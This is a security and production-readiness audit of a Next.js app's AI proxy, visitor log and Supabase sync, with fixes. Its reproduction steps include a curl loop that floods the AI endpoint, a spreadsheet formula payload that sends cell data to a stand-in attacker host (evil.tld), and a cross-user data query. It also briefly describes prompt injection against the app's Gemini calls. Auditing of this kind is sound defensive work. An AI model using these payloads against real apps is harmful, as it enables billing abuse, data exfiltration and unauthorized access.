# JMind / Jorata — Comprehensive Security & Production-Readiness Audit

**Audit date:** 2026-06-26
**Scope:** Full repository — Next.js app, API routes, cloud-sync layer, AI proxy,
visitor-log pipeline, build/deploy configuration.
**Method:** White-box source review of every route, library, and configuration
file. No live system was attacked; findings marked "exploitable" are reproducible
against the deployed app as written.

> **One-line verdict:** The app is a well-built, genuinely *local-first* product
> with good instincts (secrets kept server-side, RLS-based sync, escaped output).
> But its **three public AI endpoints have no authentication and no rate limiting**,
> which turns your paid Gemini key into a free public API for the entire internet —
> the single most important thing to fix before/right after launch. A handful of
> hardening gaps (security headers, spreadsheet-formula injection, abuse controls)
> round out the list.

---

## 1. Executive Summary

JMind is a Next.js 16 / React 19 single-page productivity app (mind maps, tasks,
KPIs, focus, wisdom). It is **local-first**: all user data lives in the browser's
`localStorage`. There is **no server-side database of user content** and **no
server-side session** in the default configuration — which dramatically shrinks
the classic attack surface (no SQLi against your own DB, no IDOR against your own
API, no server session to hijack).

The server does exactly three things, and all three are where the risk lives:

1. **AI proxy** (`/api/ai`, `/api/ai/mindmap`, `/api/ai/expand-node`) — forwards
   prompts to Google Gemini using a **secret server-side API key**.
2. **Visitor log** (`/api/visitor`) — enriches a ping with geo/IP/UA and forwards
   it to a Google Apps Script that appends a row to the owner's Google Sheet.
3. **Optional cloud sync** — a *browser-side* Supabase client; security rests
   **entirely** on Row-Level Security (RLS) policies the owner pastes in.

The architecture is sound. The problem is that the AI proxy and visitor endpoints
are **completely unauthenticated and unthrottled**, so anyone who finds the URL
can spend your money (Gemini quota), exhaust your Apps Script quota, and inject
formulas into your private spreadsheet. None of these require any account.

### Scores (0–100)

| Area | Score | One-line rationale |
|---|---:|---|
| **Security** | **58** | No SQLi/XSS/secret leaks, but unauthenticated, unthrottled paid AI proxy is a serious gap. |
| **Frontend** | 82 | Clean component model; output is safely escaped; minor a11y/perf gaps. |
| **Backend** | 60 | Tiny, tidy routes with good input caps — but zero abuse controls and no auth. |
| **Infrastructure** | 55 | No security headers, no CSP, no rate limiting, RLS never live-tested. |
| **Performance** | 78 | Local-first = fast; heavy client libs (recharts, xyflow, framer-motion) inflate bundle. |
| **Accessibility** | 70 | Semantic-ish, but unaudited contrast/focus/ARIA. |
| **SEO** | 65 | Basic metadata only; no OG image, sitemap, robots, or structured data. |
| **Production readiness** | **62** | Ships and works, but cost-DoS and missing headers should gate a public launch. |

---

## 2. Architecture & Attack Surface

### Technology stack
- **Framework:** Next.js 16.2.6 (App Router), React 19.2.4, TypeScript 5.
- **State:** Zustand 5 with `persist` → `localStorage` (per-store envelopes).
- **AI:** Google Gemini 2.5 Flash via server-side REST (key in `GEMINI_API_KEY`).
- **Sync (optional):** `@supabase/supabase-js` browser client; Postgres + RLS.
- **Visitor log (optional):** Google Apps Script Web App → Google Sheet.
- **Canvas/UI:** `@xyflow/react`, `recharts`, `framer-motion`, Tailwind 4.
- **Hosting:** Vercel (geo headers, serverless functions).

### Trust boundaries
```
[ Browser / localStorage ]  ── untrusted client, holds ALL user data
        │  fetch (no auth, no CSRF token, no origin check)
        ▼
[ Next.js API routes on Vercel ]  ── holds GEMINI_API_KEY, GSHEET_TOKEN
        │                          │
        ▼ x-goog-api-key           ▼ POST + shared token (default empty!)
[ Google Gemini ]          [ Apps Script → Google Sheet (owner's) ]

[ Browser Supabase client ] ── direct, RLS is the ONLY guard ──▶ [ Supabase Postgres ]
```

### Attack-surface map (public, no auth required)
| Endpoint | Auth | Rate limit | Abuse |
|---|---|---|---|
| `POST /api/ai` | ❌ none | ❌ none | Free AI proxy → your Gemini bill / quota DoS |
| `POST /api/ai/mindmap` | ❌ none | ❌ none | Same |
| `POST /api/ai/expand-node` | ❌ none | ❌ none | Same |
| `POST /api/visitor` | ❌ none | ❌ none | Spreadsheet flooding + formula injection |
| Apps Script `/exec` | ⚠️ token defaults to `""` | ❌ none | Direct sheet writes, bypassing your app |
| Supabase REST/Realtime | ✅ JWT + RLS | Supabase-side | Safe **only if** RLS is correct |

There is **no `middleware.ts`**, so there is no central place enforcing auth,
origin, or rate limits — every route is independently public.

---

## 3. Findings

Severity uses CVSS-style judgement: **Critical** = exploitable now with serious
impact, **High** = serious but needs a condition, **Medium** = real but bounded,
**Low/Info** = hygiene.

---

### Finding 1 — Unauthenticated, unthrottled AI proxy (your Gemini key as a free public API)

**Severity:** Critical
**Category:** Security / Backend / Cost / Reliability

**Description.** `/api/ai`, `/api/ai/mindmap`, and `/api/ai/expand-node` accept
any POST from anyone, with no authentication, no origin/referer check, and no rate
limiting. Each call spends real Google Gemini quota billed to *your* key. The
per-request input caps (`MAX_MESSAGE_CHARS=4000`, `MAX_NODES=50`, etc.) bound the
size of *one* request but do nothing to bound the *number* of requests.

**Why it matters.** Two business impacts:
- **Financial loss.** On a paid Gemini tier, an attacker scripts thousands of
  4 000-character requests and runs up your bill. There is no ceiling.
- **Denial of service.** On the free tier, an attacker exhausts your daily quota
  in minutes; legitimate users then see "AI service unavailable" all day.
- **Reputation / ToS.** Your key can be used to generate arbitrary content
  (subject only to Gemini's own safety filter) and attributed to your project.

**How to reproduce.**
```bash
# Burn quota with a loop — no token, no cookie, nothing.
for i in $(seq 1 1000); do
  curl -s -X POST https://YOUR-APP.vercel.app/api/ai \
    -H 'Content-Type: application/json' \
    -d '{"message":"'"$(head -c 3900 /dev/zero | tr '\0' 'a')"'"}' &
done
```

**Exploit scenario.** A competitor or troll finds the endpoint (it's in your
client JS), points a small script at it overnight, and you wake to a depleted free
quota (users locked out) or — worse on a paid plan — a four-figure invoice. Other
sites can also embed your endpoint as their own free AI backend.

**Evidence.** `src/app/api/ai/route.ts:44` — `export async function POST` with no
auth/rate-limit guard; same in `mindmap/route.ts:55` and `expand-node/route.ts:50`.
Repo-wide grep for `rate.?limit|throttle|upstash` returns nothing.

**Recommended fix (layered — do at least the first two before launch):**
1. **Rate limit by IP** (Vercel populates `x-forwarded-for`). Use a serverless
   store such as Upstash Redis or Vercel KV with a sliding window:
   ```ts
   // src/lib/rate-limit.ts
   import { Ratelimit } from "@upstash/ratelimit";
   import { Redis } from "@upstash/redis";
   export const aiLimiter = new Ratelimit({
     redis: Redis.fromEnv(),
     limiter: Ratelimit.slidingWindow(20, "1 h"),   // 20 AI calls / IP / hour
     prefix: "rl:ai",
   });
   ```
   ```ts
   // at the top of each AI route handler:
   const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "anon";
   const { success } = await aiLimiter.limit(ip);
   if (!success) return NextResponse.json({ error: "Too many requests." }, { status: 429 });
   ```
2. **Restrict origin.** Reject requests whose `Origin`/`Referer` is not your own
   domain (defeats casual cross-site reuse; not a substitute for rate limiting):
   ```ts
   const origin = request.headers.get("origin") ?? "";
   const allowed = ["https://YOUR-APP.vercel.app", "http://localhost:3000"];
   if (origin && !allowed.includes(origin)) return new NextResponse(null, { status: 403 });
   ```
3. **Tie AI usage to a signed-in Supabase user** once sync is enabled (verify the
   JWT server-side and rate-limit per user-id), so anonymous abuse is impossible.
4. **Set a hard spend cap / budget alert in Google Cloud** as a backstop.

---

### Finding 2 — Google Sheet (CSV/formula) injection via the visitor log

**Severity:** High
**Category:** Security (injection)

**Description.** `/api/visitor` forwards several attacker-controlled string fields
— `name`, `path`, `referrer`, `timeZone`, `language`, `visitorId` — to the Apps
Script, which writes them verbatim with `sheet.appendRow([...])`. Google Sheets
interprets any cell whose value begins with `=`, `+`, `-`, or `@` as a **formula**.
The server's `clean()` only collapses whitespace and truncates; it does **not**
neutralise a leading formula character.

**Why it matters.** When *you* (the owner) open the visitor sheet, malicious
formulas execute in your authenticated Google session:
- `=IMPORTRANGE` / `=IMAGE` / `=HYPERLINK` can **exfiltrate** other cell data to
  an attacker-controlled URL or trick you into clicking a phishing link.
- `=` formulas can corrupt or reshuffle the log.
This is the classic "CSV injection" turned into live-spreadsheet injection.

**How to reproduce.**
```bash
curl -s -X POST https://YOUR-APP.vercel.app/api/visitor \
  -H 'Content-Type: application/json' \
  -d '{"event":"joined","name":"=HYPERLINK(\"https://evil.tld?x=\"&A2,\"click me\")"}'
```
Open the sheet → the "Name" cell renders an active hyperlink built from row data.

**Evidence.**
- `src/app/api/visitor/route.ts:21` — `clean()` does not strip leading `= + - @`.
- `google-apps-script/Code.gs` — `sheet.appendRow([... data.name ...])` writes raw.

**Recommended fix.** Neutralise formula triggers before storing. Do it in *both*
places (defence in depth):
```ts
// server clean() — prefix a zero-width-safe apostrophe / space for risky leads
const clean = (value: unknown, max: number) => {
  let s = String(value ?? "").replace(/\s+/g, " ").trim().slice(0, max);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;   // force text, not formula
  return s;
};
```
And in `Code.gs`, set cells as plain text or prefix `'` for any value matching
`/^[=+\-@]/`. Also consider `range.setNumberFormat('@')` on the data columns.

---

### Finding 3 — No security headers / no Content-Security-Policy

**Severity:** High
**Category:** Security / Infrastructure (defence in depth)

**Description.** `next.config.ts` is empty — the app ships with **no** security
response headers. Missing: `Content-Security-Policy`, `X-Frame-Options` /
`frame-ancestors` (clickjacking), `Strict-Transport-Security` (HSTS),
`X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`.

**Why it matters.**
- **Clickjacking:** with no `X-Frame-Options`/`frame-ancestors 'none'`, your app
  can be framed by a malicious site to trick users into clicking actions.
- **No CSP** means that *if* any XSS sink is ever introduced (today output is
  safely escaped — see Finding 8), there is no second line of defence, and no
  control over where data can be exfiltrated to.
- **No HSTS** leaves a downgrade window on first visit.

**Evidence.** `next.config.ts:3` — `const nextConfig: NextConfig = {};`.

**Recommended fix.** Add a headers block (or a `middleware.ts`). A starting CSP —
note the inline theme script in `layout.tsx:28` needs a nonce or a hash, or move
it to an external file:
```ts
// next.config.ts
const csp = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",     // tighten with a nonce; covers the theme script
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "connect-src 'self' https://*.supabase.co https://generativelanguage.googleapis.com",
  "frame-ancestors 'none'",
  "base-uri 'self'",
].join("; ");

const securityHeaders = [
  { key: "Content-Security-Policy", value: csp },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
];

const nextConfig: NextConfig = {
  async headers() { return [{ source: "/:path*", headers: securityHeaders }]; },
};
```

---

### Finding 4 — Visitor pipeline has no rate limit and the shared token defaults to empty

**Severity:** Medium
**Category:** Security / Reliability (abuse, quota exhaustion)

**Description.** `/api/visitor` has no rate limiting, so anyone can append unlimited
rows to your Google Sheet, exhausting the Apps Script execution/URL-fetch daily
quota and burying real entries. Worse, the Apps Script `SECRET` defaults to `""`
(`google-apps-script/Code.gs:13`), and when empty the token check is **skipped** —
so if the `/exec` URL leaks, an attacker can write to the sheet **directly**,
bypassing your app entirely.

**Why it matters.** Loss of the analytics signal (sheet flooded), Apps Script
quota burn (legitimate logs dropped for the rest of the day), and a stored-injection
vector (combine with Finding 2). The `/exec` URL is discoverable only server-side
*for /api/visitor*, but the Apps Script URL itself is a long-lived secret with no
real authentication when `SECRET=""`.

**Evidence.** `src/app/api/visitor/route.ts` (no limiter); `google-apps-script/Code.gs:13`
`var SECRET = "";` and `if (SECRET && data.token !== SECRET)` — the guard is a
no-op when `SECRET` is blank.

**Recommended fix.**
- Rate-limit `/api/visitor` per IP (same limiter as Finding 1, looser window).
- **Always set a strong `SECRET`/`GSHEET_TOKEN`.** Make the docs/setup treat it as
  mandatory, not optional; reject writes when unset rather than allowing them.
- De-duplicate by `visitorId` + day server-side to cap rows per device.

---

### Finding 5 — Cloud-sync confidentiality rests entirely on RLS that was never live-tested

**Severity:** High (conditional — only when sync is enabled)
**Category:** Security / Database

**Description.** The Supabase client runs **in the browser** with the public anon
key. Every query (`user_state`, `profiles`) and the realtime channel filter
(`user_id=eq.${userId}`, `sync-engine.ts:242`) is *client-supplied* and trusts the
server-side RLS policies in `SETUP.md` to scope rows to `auth.uid()`. The client
`.eq("user_id", userId)` filter is **not** a security control — an attacker using
their own valid token can query any `user_id`; only RLS stops them. Crucially,
`SETUP.md:143` states the whole sync path "was built and type-checked … **without
network access to Supabase**" and the RLS isolation "must be verified by the owner."

**Why it matters.** If the owner skips a policy, enables Realtime without RLS, or
mis-pastes the SQL, **any signed-in user can read or overwrite every other user's
entire dataset** (tasks, notes, reflections) — a full IDOR/BOLA breach. The
correctness of the most sensitive control is currently unverified.

**Exploit scenario (if RLS is missing on `user_state`):**
```js
// authenticated as attacker; victimId known or enumerated
const { data } = await supabase.from("user_state").select("stores").eq("user_id", victimId);
// → victim's full synced state if RLS is absent/broken
```

**Evidence.** `src/lib/sync/supabase.ts` (browser client, anon key);
`src/lib/sync/sync-engine.ts:386` `fetchCloud` / `:396` `upsertCloud` rely on RLS;
`SETUP.md:80–85` policies; `SETUP.md:143` "must be verified by the owner."

**Recommended fix.**
- **Before enabling sync for anyone, prove RLS.** Sign in as user A, then as user
  B, and confirm B cannot `select`/`update` A's row. Automate this as a smoke test.
- Confirm **Realtime respects RLS** (enable "Realtime RLS"); otherwise change
  broadcasts can leak across users even if REST is locked down.
- Add a `not null` + FK (already present) and consider a DB `check` that
  `stores` size is bounded to prevent a malicious client from storing huge blobs.
- Treat the documented SQL as load-bearing security code: keep it in the repo
  (e.g. `supabase/policies.sql`) and version it, don't leave it only in prose.

---

### Finding 6 — No CSRF protection / no origin enforcement on state-changing POSTs

**Severity:** Medium
**Category:** Security

**Description.** All API routes accept simple JSON POSTs with no CSRF token and no
origin check. Because the AI and visitor routes use no cookies/session, classic
CSRF (riding the victim's auth) doesn't grant privilege — but the lack of any
origin gate is what lets *any* website invoke your AI proxy and visitor log on
your behalf (amplifying Findings 1, 2, 4). Supabase auth uses bearer tokens in
`localStorage` (not cookies), so it is not CSRF-able, but that also means tokens
are readable by any successful XSS (see Finding 8 for why CSP matters).

**Recommended fix.** Enforce the `Origin` allow-list shown in Finding 1 on every
route. It is the cheapest single control that blunts cross-site abuse.

---

### Finding 7 — Prompt injection into Gemini (bounded, but present)

**Severity:** Low
**Category:** Security (AI)

**Description.** User text and mind-map node titles are concatenated into the
Gemini prompt (`api/ai/route.ts:78`, `mindmap/route.ts:81`, `expand-node/route.ts:64`).
A user can inject instructions ("ignore the above and …"). Impact is low because:
the model has **no tools, no functions, no data access**; output is returned as
text and rendered **escaped** (Finding 8); and there's no privileged context to
exfiltrate. The realistic worst case is the model producing off-topic/objectionable
text in the user's *own* session.

**Recommended fix.** Accept as low risk. If you later give the model tools or feed
it other users' data, revisit. Keep the system prompt authoritative and consider a
short output-length/format check.

---

### Finding 8 — Output rendering is safe today, but there is no margin for error (informational, positive)

**Severity:** Informational
**Category:** Frontend security

**Findings worth recording as *correct*:**
- AI replies render via React text interpolation (`AiMessage.tsx:21` `{message.text}`)
  → **auto-escaped**, no `dangerouslySetInnerHTML`. No markdown-to-HTML sink. Good.
- The only `dangerouslySetInnerHTML` is the theme bootstrap script
  (`layout.tsx:28`), which reads `localStorage` and **validates against a fixed
  whitelist** (`['ocean','violet','rose','amber']`) before touching the DOM — not
  injectable. Good.
- The mind-map AI tree is normalised with strict depth/breadth/length caps
  (`mindmap-ai.ts:43`), and node labels render as escaped text. Good.
- `mergeById`/snapshot merge key only by string `id` and re-run each store's
  sanitizer on rehydrate; object spread of `JSON.parse` output creates own
  `__proto__` data properties rather than polluting the prototype — **no prototype
  pollution** found. Good.

The note: with **no CSP** (Finding 3), the day someone adds a markdown renderer,
`v-html`-style sink, or third-party script, a single mistake becomes full XSS that
can read the Supabase token from `localStorage`. CSP buys you a safety net.

---

### Finding 9 — Email verification disabled by recommendation; weak account hygiene

**Severity:** Low
**Category:** Security (auth)

**Description.** `SETUP.md:39` recommends turning **off** "Confirm email." That
makes onboarding frictionless but means: (a) users can register with **email
addresses they don't own**, and (b) there's no proof of address for recovery.
There is also no app-level password-strength enforcement beyond Supabase defaults,
and no MFA. Blast radius is limited because each account only sees its own data,
but unverified emails enable nuisance signups and complicate account recovery.

**Recommended fix.** Acceptable for a personal tool, but if this grows: re-enable
email confirmation (and configure SMTP to avoid the rate limit the docs warn
about), set a minimum password length/complexity in Supabase, and offer TOTP MFA.

---

### Finding 10 — Body parsed before size validation; generic abuse hardening

**Severity:** Low
**Category:** Backend / Reliability

**Description.** Each route calls `await request.json()` and *then* applies char
caps. Next.js imposes a default body-size limit, so this isn't unbounded, but the
parse happens before your own guard. Combined with no rate limiting, a flood of
medium-size bodies is the realistic resource pressure (covered by Finding 1).

**Recommended fix.** Add an explicit `Content-Length` check and reject oversized
bodies before parsing; set route `runtime`/`maxDuration` deliberately. Low priority
once rate limiting (Finding 1) lands.

---

## 4. Phase-by-phase notes (non-security)

**Backend / reliability.** Routes are small, well-commented, and fail gracefully
(Gemini 5xx retry + model fallback in `gemini.ts`; visitor log no-ops when
unconfigured). The sync engine's last-writer-wins with per-store `updatedAt` and an
offline queue is thoughtfully done. Main gaps are *operational*: no structured
logging/metrics, no alerting, and `console.error` is the only observability.

**Database.** No owned relational schema (local-first). The only server data is the
JSON `user_state` blob per user. Watch unbounded growth of `stores` jsonb (a heavy
user could store a large blob); add a size guard. Realtime + RLS must be verified
together (Finding 5).

**Frontend / performance.** Bundle includes `@xyflow/react`, `recharts`,
`framer-motion`, `html-to-image` — all sizable. Verify route-level code splitting
so the mind-map canvas and charts don't load on the dashboard. No obvious memory
leaks, but the sync engine attaches `window` focus/online listeners and store
subscriptions — confirm they're torn down on sign-out (they are, in
`teardownSignedInState`).

**Accessibility.** Not audited live. Action: run axe/Lighthouse, verify color
contrast on the dark theme, keyboard nav for the command palette and canvas, focus
traps in modals, and ARIA on icon-only buttons.

**SEO.** `layout.tsx` sets title/description only. Missing: Open Graph/Twitter
cards + image, `robots.txt`, `sitemap.xml`, canonical URLs, and JSON-LD. For an app
(not content site) this is low stakes, but easy wins exist.

**DevOps.** No CI workflow, no automated tests, no dependency scanning. `.gitignore`
correctly excludes `.env*` (only `.env.example` is tracked — verified no secrets
committed). Deployment is Vercel-implicit; add a CI gate (lint + build +
`npm audit`) and Dependabot.

---

## 5. Top 10 issues (ranked)

1. **Unauthenticated, unthrottled AI proxy** — cost/DoS. *(Finding 1, Critical)*
2. **Cloud-sync RLS unverified** — potential full IDOR if misconfigured. *(F5, High)*
3. **Spreadsheet formula injection via visitor log.** *(F2, High)*
4. **No security headers / CSP.** *(F3, High)*
5. **Visitor log: no rate limit + empty default token.** *(F4, Medium)*
6. **No origin enforcement / cross-site endpoint reuse.** *(F6, Medium)*
7. **Email verification off; weak account hygiene.** *(F9, Low)*
8. **Prompt injection (bounded).** *(F7, Low)*
9. **Body parsed before size check.** *(F10, Low)*
10. **No CI / tests / dependency scanning.** *(§4, Low)*

## 6. Quick wins (< 1 hour each)
- Add the **security-headers block** to `next.config.ts` (Finding 3).
- Add the **`Origin` allow-list** check to all four routes (Finding 6).
- **Strip leading `=+-@`** in visitor `clean()` (Finding 2).
- **Set `GSHEET_TOKEN`/`SECRET`** and make the Apps Script reject blank tokens (F4).
- Add `robots.txt`, `sitemap`, and an OG image (SEO).

## 7. Medium effort (this week)
- Stand up **Upstash/Vercel KV rate limiting** and apply to AI + visitor routes (F1, F4).
- **Live-test RLS** with two accounts and commit the SQL to `supabase/policies.sql` (F5).
- Add a **CI workflow**: lint, `next build`, `npm audit`, Dependabot.
- Run **Lighthouse/axe** and fix top accessibility + bundle-split issues.

## 8. Long-term / architectural
- **Gate AI usage behind a signed-in user** and rate-limit per user-id (F1).
- Add **observability** (structured logs, error tracking like Sentry, quota alerts).
- Add a **Google Cloud spend cap** + budget alarms on the Gemini key.
- Consider a thin **server-side sync API** (service-role behind auth) instead of a
  pure browser client, so security no longer depends solely on hand-pasted RLS.

## 9. Priority roadmap
- **Fix immediately (before public launch):** F1 (rate limit AI), F3 (headers),
  F2 (formula injection), F6 (origin check).
- **This week:** F4 (visitor abuse + token), F5 (verify + version RLS).
- **This month:** CI + tests + `npm audit`, accessibility pass, SEO basics, observability.
- **Future:** per-user AI auth, server-side sync API, MFA, spend governance.

---

## 10. Production-readiness verdict

**Conditionally ready.** As a *local-first personal tool* it is solid and the data
model keeps most classic web vulns off the table. **It should not be promoted to a
public URL until Finding 1 (AI rate limiting) and Finding 3 (security headers) are
fixed**, because the day it's discovered, the AI endpoints will be abused for cost
and the app can be framed for clickjacking. Findings 2, 4, 5, and 6 should follow
within the first week. Assume the endpoints *will* be hit by a script the moment
they're public — design the limits accordingly.

*Biggest risk:* surprise Gemini bill / quota DoS. *Biggest data-loss risk:*
misconfigured RLS exposing or overwriting all users' synced data. *Biggest
reputation risk:* your key generating arbitrary AI content attributed to you.
